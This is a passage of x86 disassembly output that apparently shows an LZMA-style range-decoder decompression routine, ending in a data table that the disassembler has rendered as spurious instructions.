  406baf:	75 1c                	jne    0x406bcd
  406bb1:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406bb4:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406bb7:	c1 e0 04             	shl    $0x4,%eax
  406bba:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  406bc1:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  406bc8:	e9 38 ff ff ff       	jmp    0x406b05
  406bcd:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  406bd4:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  406bdb:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  406be2:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  406be9:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406bec:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  406bf3:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406bf6:	eb 28                	jmp    0x406c20
  406bf8:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406bfc:	0f 84 32 01 00 00    	je     0x406d34
  406c02:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406c05:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406c08:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406c0c:	0f b6 09             	movzbl (%ecx),%ecx
  406c0f:	ff 4d 94             	decl   -0x6c(%ebp)
  406c12:	c1 e0 08             	shl    $0x8,%eax
  406c15:	0b c1                	or     %ecx,%eax
  406c17:	ff 45 90             	incl   -0x70(%ebp)
  406c1a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c1d:	ff 4d b8             	decl   -0x48(%ebp)
  406c20:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406c24:	7e 5e                	jle    0x406c84
  406c26:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406c29:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406c2c:	c1 e9 0b             	shr    $0xb,%ecx
  406c2f:	8d 14 00             	lea    (%eax,%eax,1),%edx
  406c32:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406c35:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406c38:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406c3b:	66 8b 06             	mov    (%esi),%ax
  406c3e:	0f b7 f8             	movzwl %ax,%edi
  406c41:	0f af cf             	imul   %edi,%ecx
  406c44:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406c47:	73 17                	jae    0x406c60
  406c49:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406c4c:	b9 00 08 00 00       	mov    $0x800,%ecx
  406c51:	2b cf                	sub    %edi,%ecx
  406c53:	c1 f9 05             	sar    $0x5,%ecx
  406c56:	03 c8                	add    %eax,%ecx
  406c58:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406c5b:	66 89 0e             	mov    %cx,(%esi)
  406c5e:	eb 16                	jmp    0x406c76
  406c60:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406c63:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406c66:	66 8b c8             	mov    %ax,%cx
  406c69:	66 c1 e9 05          	shr    $0x5,%cx
  406c6d:	2b c1                	sub    %ecx,%eax
  406c6f:	42                   	inc    %edx
  406c70:	66 89 06             	mov    %ax,(%esi)
  406c73:	89 55 b0             	mov    %edx,-0x50(%ebp)
  406c76:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406c7d:	73 9e                	jae    0x406c1d
  406c7f:	e9 74 ff ff ff       	jmp    0x406bf8
  406c84:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  406c87:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  406c8a:	33 c0                	xor    %eax,%eax
  406c8c:	40                   	inc    %eax
  406c8d:	d3 e0                	shl    %cl,%eax
  406c8f:	2b d8                	sub    %eax,%ebx
  406c91:	8b 45 84             	mov    -0x7c(%ebp),%eax
  406c94:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406c97:	e9 04 ff ff ff       	jmp    0x406ba0
  406c9c:	01 5d d0             	add    %ebx,-0x30(%ebp)
  406c9f:	8b 45 80             	mov    -0x80(%ebp),%eax
  406ca2:	e9 f9 fe ff ff       	jmp    0x406ba0
  406ca7:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  406cae:	00 00 00 
  406cb1:	e9 88 00 00 00       	jmp    0x406d3e
  406cb6:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  406cbd:	00 00 00 
  406cc0:	eb 7c                	jmp    0x406d3e
  406cc2:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  406cc9:	00 00 00 
  406ccc:	eb 70                	jmp    0x406d3e
  406cce:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  406cd5:	00 00 00 
  406cd8:	eb 64                	jmp    0x406d3e
  406cda:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  406ce1:	00 00 00 
  406ce4:	eb 58                	jmp    0x406d3e
  406ce6:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  406ced:	00 00 00 
  406cf0:	eb 4c                	jmp    0x406d3e
  406cf2:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  406cf9:	00 00 00 
  406cfc:	eb 40                	jmp    0x406d3e
  406cfe:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  406d05:	00 00 00 
  406d08:	eb 34                	jmp    0x406d3e
  406d0a:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  406d11:	00 00 00 
  406d14:	eb 28                	jmp    0x406d3e
  406d16:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  406d1a:	eb 22                	jmp    0x406d3e
  406d1c:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  406d23:	00 00 00 
  406d26:	eb 16                	jmp    0x406d3e
  406d28:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  406d2f:	00 00 00 
  406d32:	eb 0a                	jmp    0x406d3e
  406d34:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  406d3b:	00 00 00 
  406d3e:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  406d44:	6a 22                	push   $0x22
  406d46:	59                   	pop    %ecx
  406d47:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  406d4d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406d4f:	33 c0                	xor    %eax,%eax
  406d51:	eb 03                	jmp    0x406d56
  406d53:	83 c8 ff             	or     $0xffffffff,%eax
  406d56:	5f                   	pop    %edi
  406d57:	5e                   	pop    %esi
  406d58:	5b                   	pop    %ebx
  406d59:	c9                   	leave
  406d5a:	c3                   	ret
  406d5b:	48                   	dec    %eax
  406d5c:	63 40 00             	arpl   %eax,0x0(%eax)
  406d5f:	ed                   	in     (%dx),%eax
  406d60:	63 40 00             	arpl   %eax,0x0(%eax)
  406d63:	88 64 40 00          	mov    %ah,0x0(%eax,%eax,2)
  406d67:	5d                   	pop    %ebp
  406d68:	64 40                	fs inc %eax
  406d6a:	00 1d 6b 40 00 6b    	add    %bl,0x6b00406b
  406d70:	6b 40 00 ae          	imul   $0xffffffae,0x0(%eax),%eax
  406d74:	64 40                	fs inc %eax
  406d76:	00 4d 67             	add    %cl,0x67(%ebp)
  406d79:	40                   	inc    %eax
  406d7a:	00 b7 67 40 00 fa    	add    %dh,-0x5ffbf99(%edi)
  406d80:	67 40                	addr16 inc %eax
  406d82:	00 6b 68             	add    %ch,0x68(%ebx)
  406d85:	40                   	inc    %eax
  406d86:	00 92 68 40 00 52    	add    %dl,0x52004068(%edx)
  406d8c:	69 40 00 47 65 40 00 	imul   $0x406547,0x0(%eax),%eax
  406d93:	00 66 40             	add    %ah,0x40(%esi)
  406d96:	00 c4                	add    %al,%ah
  406d98:	66 40                	inc    %ax
  406d9a:	00 d5                	add    %dl,%ch
  406d9c:	69 40 00 a5 67 40 00 	imul   $0x4067a5,0x0(%eax),%eax
  406da3:	e4 6a                	in     $0x6a,%al
  406da5:	40                   	inc    %eax
  406da6:	00 a1 6b 40 00 92    	add    %ah,-0x6dffbf95(%ecx)
  406dac:	6c                   	insb   (%dx),%es:(%edi)
  406dad:	40                   	inc    %eax
  406dae:	00 cc                	add    %cl,%ah
  406db0:	68 40 00 e3 68       	push   $0x68e30040
  406db5:	40                   	inc    %eax
  406db6:	00 df                	add    %bl,%bh
  406db8:	6b 40 00 ee          	imul   $0xffffffee,0x0(%eax),%eax
  406dbc:	6b 40 00 11          	imul   $0x11,0x0(%eax),%eax
  406dc0:	69                   	.byte 0x69
  406dc1:	40                   	inc    %eax
  406dc2:	00                   	.byte 0
  406dc3:	93                   	xchg   %eax,%ebx
  406dc4:	66                   	data16
